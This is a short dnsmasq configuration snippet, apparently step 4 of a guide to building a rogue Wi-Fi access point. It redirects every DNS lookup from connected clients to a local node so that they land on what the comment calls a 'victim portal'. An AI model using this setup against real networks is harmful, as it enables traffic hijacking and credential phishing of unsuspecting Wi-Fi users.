# /etc/NetworkManager/dnsmasq-shared.d/portal.conf (file 01 step 4)
# While a client is on the user AP, every DNS name resolves to the node so
# the captive portal probe and any typed URL land on the victim portal.
address=/#/10.42.0.1
